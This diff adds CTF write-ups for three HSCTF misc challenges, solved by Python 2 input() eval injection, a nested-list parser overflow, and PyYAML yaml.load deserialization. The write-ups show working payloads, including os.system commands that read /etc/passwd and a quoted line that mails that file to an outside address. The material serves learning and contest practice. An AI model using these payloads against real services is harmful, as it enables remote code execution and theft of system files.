@@ -40,6 +40,81 @@ So I will try to discuss the challenges i loved the most here:
 
 # MISC
 
+## A Simple Conversation-:
+> description: 
+
+
+<img src="assets/misc/simpleconversation.png" width="400px" height="400px" >
+
+
+### Solution:
+ 
+On looking to the section of source code we see
+
+```python
+print("What's your age?")
+
+age = input("> ")
+
+sleep(1)
+
+```
+Then I try to think that when it parses the input to input() then it tries to evaluate it first that is is it string , dictionary ,tuple or etc. So guessing the flag is on the server I try to send the arguments as yu can see.
+
+```streaker@DESKTOP-DS7FIJL:$ nc misc.hsctf.com 9001
+Hello!
+Hey, can you help me out real quick.
+I need to know your age.
+What's your age?
+> open("flag").read()
+Traceback (most recent call last):
+  File "talk.py", line 18, in <module>
+    age = input("> ")
+  File "<string>", line 1, in <module>
+IOError: [Errno 2] No such file or directory: 'flag'
+streaker@DESKTOP-DS7FIJL:$ nc misc.hsctf.com 9001
+Hello!
+Hey, can you help me out real quick.
+I need to know your age.
+What's your age?
+> open("flag.txt").read()
+Wow!
+Sometimes I wish I was hsctf{plz_u5e_pyth0n_3}
+...
+```
+There you can see the flag:`hsctf{plz_u5e_pyth0n_3}`
+
+## Broken_Repl-:
+> description: 
+
+
+<img src="assets/misc/brokenrepl.png" width="400px" height="400px" >
+
+ ### Solution:
+ 
+```python
+    try: # try to compile the input
+                code = compile(line, "<input>", "exec") # compile the line of input
+            except (OverflowError, SyntaxError, ValueError, TypeError, RecursionError) as e: # user input was bad
+                print("there was an error in your code:", e) # notify the user of the error
+            if False: exec(code) # run the code
+            # TODO: find replacement for exec
+            # TODO: exec is unsafe
+except MemoryError: # we ran out of memory
+    # uh oh
+    # lets remove the flag to clear up some memory
+    print(flag) # log the flag so it is not lost
+```
+You can see that you have to cause memoory error only. So my teammate Lucas looked on web and finds out [this](https://stackoverflow.com/questions/50709371/ast-literal-eval-memory-error-on-nested-list).
+So you can see that we can cause memory error from nested list.Great learning :smiley:
+
+```python
+echo "[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]" | nc misc.hsctf.com 8550
+>>> s_push: parser stack overflow
+hsctf{dont_you_love_parsers}
+```
+There is the flag:`hsctf{dont_you_love_parsers}`
+    
 ## Hidden Flag-:
 > description: 
 
@@ -171,3 +246,70 @@ Explanation:Why it happens that on the reverse bytes we can't see any characters
 
 So on reversing 8 bytes it messed up as it reversed in two parts of four and four.Thus resulting in random chars.
 So you can see the flag now:`hsctf{utf8_for_the_win}`
+
+## JsonInfo-:
+> description: 
+
+<img src="assets/misc/jsoninfo.png" width="400px" height="400px" >
+
+### Solution:
+Trying few thing we see that it accepts string and show that it's json or give the error otherwise.
+So We quite stuck on thinking that what kind of error we have to produce.Then googling skills had to come as it is misc, so we found a beautiful [link](https://bzdww.com/article/164589/) and in section 5 we see yaml.load
+and here is the warning:
+
+>Refer to the PyYAML documentation:
+
+>Warning: It is not safe to call yaml.load with data received from an untrusted source! Yaml.load is just as powerful as pickle.load, so you can call any Python function.
+In this beautiful example found in the popular Python project Ansible , you can provide this value as (valid) YAML to Ansible Vault, which calls os.system() with the parameters provided in the file.
+
+>!!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"]
+Therefore, effectively loading YAML files from user-supplied values ​​will open the door for attacks.
+
+>repair:
+
+>Always use yaml.safe_load unless you have a very good reason.
+
+So we tried to do these thing as instructed here to see if the vulnerability is here:
+
+```
+Welcome to JSON info!
+Please enter your JSON:
+!!python/object/apply:os.system ["cat /etc/passwd "]
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+syslog:x:101:102::/home/syslog:/usr/sbin/nologin
+Type int is unsupported
+Please use a valid JSON array or object
+Thank you for using JSON info!
+
+```
+SO yeah the vulnerability is here, Great!!!
+
+```
+streaker@DESKTOP-DS7FIJL:$ nc -q 1 misc.hsctf.com 9999
+Welcome to JSON info!
+Please enter your JSON:
+!!python/object/apply:os.system ["cat flag.txt"]
+hsctf{JS0N_or_Y4ML}
+Type int is unsupported
+Please use a valid JSON array or object
+Thank you for using JSON info!
+```
+The flag is:`hsctf{JS0N_or_Y4ML}`
